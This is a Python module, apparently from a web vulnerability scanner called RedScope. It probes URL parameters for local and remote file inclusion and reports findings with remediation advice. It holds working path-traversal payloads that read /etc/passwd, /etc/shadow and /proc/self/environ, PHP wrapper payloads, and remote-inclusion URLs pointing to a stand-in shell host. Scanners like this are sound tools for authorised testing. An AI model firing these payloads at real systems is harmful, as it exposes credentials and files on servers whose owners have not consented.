import re
from typing import List, Optional
from urllib.parse import urlparse, parse_qs

import requests

from core.base_module import BaseModule, ScanResult, Finding

LFI_PARAMS = [
    "file", "page", "path", "include", "doc", "document", "folder",
    "root", "dir", "template", "view", "layout", "load", "read",
    "location", "lang", "language", "module", "conf", "config",
    "content", "data", "filename", "filepath", "src", "source",
]

LFI_PAYLOADS = [
    # Unix path traversal
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "/etc/passwd%00",          # Null byte (older PHP)
    "....\/....\/etc/passwd",
    # Windows path traversal
    "..\\..\\..\\windows\\win.ini",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "../../../../windows/win.ini",
    # Sensitive Unix files
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../etc/hostname",
    "../../../../proc/self/environ",
    "../../../../proc/version",
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/nginx/access.log",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/read=convert.base64-encode/resource=config.php",
    "php://input",
    "data://text/plain;base64,dGVzdA==",
    # Log poisoning targets
    "../../../../var/log/auth.log",
    "../../../../var/log/mail.log",
]

RFI_PAYLOADS = [
    "http://evil-redscope-test.com/shell.php",
    "https://evil-redscope-test.com/shell.php",
    "//evil-redscope-test.com/shell.php",
    "ftp://evil-redscope-test.com/shell.php",
]

# Indicators that LFI succeeded
LFI_INDICATORS = [
    (r"root:.*:0:0:",              "Unix /etc/passwd content"),
    (r"\[extensions\]",            "Windows win.ini content"),
    (r"daemon:.*:/usr/sbin",       "Unix /etc/passwd content"),
    (r"DOCUMENT_ROOT=",            "PHP environ leak"),
    (r"Linux version \d",          "/proc/version leak"),
    (r"127\.0\.0\.1\s+localhost",  "/etc/hosts leak"),
    (r"shadow:.*:!",               "/etc/shadow content"),
    (r"apache|nginx",              "Log file content"),
    (r"[a-zA-Z0-9+/]{40,}={0,2}", "Base64 encoded file (PHP wrapper)"),
]

# Indicators that RFI succeeded (domain reflected in response)
RFI_INDICATOR = "evil-redscope-test.com"


class Module(BaseModule):
    name = "lfi"
    description = "LFI/RFI scanner — path traversal, PHP wrapper, and remote file inclusion"
    author = "RedScope"
    version = "1.0.0"

    def run(self, target: str, **kwargs) -> ScanResult:
        result = ScanResult(module=self.name, target=target)
        url = target if target.startswith("http") else f"https://{target}"

        session = requests.Session()
        session.headers["User-Agent"] = self.config["general"]["user_agent"]
        timeout = self.config["general"]["timeout"]

        self.log.info(f"LFI/RFI scan on [bold]{url}[/]")

        existing_params = self._extract_params(url)
        base_url = url.split("?")[0] if existing_params else url
        params_to_test = list(set(existing_params) | set(LFI_PARAMS))

        self.log.info(f"  Testing {len(params_to_test)} params × {len(LFI_PAYLOADS)} LFI payloads")

        for param in params_to_test:
            # LFI
            finding = self._test_lfi(session, base_url, param, timeout)
            if finding:
                result.add_finding(finding)
                continue

            # RFI
            finding = self._test_rfi(session, base_url, param, timeout)
            if finding:
                result.add_finding(finding)

        if not result.findings:
            self.log.info("[dim]No LFI/RFI detected[/]")

        return result

    def _test_lfi(self, session, base_url, param, timeout) -> Optional[Finding]:
        for payload in LFI_PAYLOADS:
            try:
                resp = session.get(
                    base_url,
                    params={param: payload},
                    timeout=timeout,
                    verify=False,
                    allow_redirects=True,
                )
                body = resp.text

                for pattern, label in LFI_INDICATORS:
                    if re.search(pattern, body):
                        self.log.info(f"  [bold red]LFI CONFIRMED[/] param={param} payload={payload!r} indicator={label}")
                        severity = "critical" if "passwd" in label or "shadow" in label or "environ" in label else "high"
                        return Finding(
                            title=f"Local File Inclusion — parameter: {param}",
                            severity=severity,
                            description=(
                                f"LFI confirmed in parameter '{param}'. "
                                f"Server returned local file content: {label}. "
                                "An attacker can read sensitive files including credentials, configs, and source code."
                            ),
                            evidence=(
                                f"URL: {base_url}?{param}={payload}\n"
                                f"Indicator matched: {label}\n"
                                f"Response excerpt:\n{self._excerpt(body)}"
                            ),
                            remediation=(
                                "Never pass user-supplied input directly to file include/read functions. "
                                "Use a whitelist of allowed file names. "
                                "Disable allow_url_include and allow_url_fopen in PHP. "
                                "Run the application with least-privilege filesystem access."
                            ),
                            tags=["lfi", "path-traversal", "web"],
                        )
            except requests.RequestException:
                continue
        return None

    def _test_rfi(self, session, base_url, param, timeout) -> Optional[Finding]:
        for payload in RFI_PAYLOADS:
            try:
                resp = session.get(
                    base_url,
                    params={param: payload},
                    timeout=timeout,
                    verify=False,
                    allow_redirects=True,
                )
                if RFI_INDICATOR in resp.text or resp.status_code in (200, 500):
                    # Heuristic: if the external domain appears in response, RFI may be happening
                    if RFI_INDICATOR in resp.text:
                        self.log.info(f"  [bold red]RFI POSSIBLE[/] param={param} payload={payload!r}")
                        return Finding(
                            title=f"Remote File Inclusion — parameter: {param}",
                            severity="critical",
                            description=(
                                f"Possible Remote File Inclusion in parameter '{param}'. "
                                f"The external domain was reflected in the response, suggesting "
                                "the server attempted to fetch and include the remote URL."
                            ),
                            evidence=(
                                f"URL: {base_url}?{param}={payload}\n"
                                f"External domain found in response body."
                            ),
                            remediation=(
                                "Disable allow_url_include in PHP (php.ini). "
                                "Validate and whitelist all file paths. "
                                "Block outbound HTTP from the web server where possible."
                            ),
                            tags=["rfi", "web", "critical"],
                        )
            except requests.RequestException:
                continue
        return None

    def _extract_params(self, url: str) -> List[str]:
        parsed = urlparse(url)
        return list(parse_qs(parsed.query).keys())

    def _excerpt(self, text: str, length: int = 300) -> str:
        text = "\n".join(text.splitlines()[:10])
        return text[:length] + ("..." if len(text) > length else "")
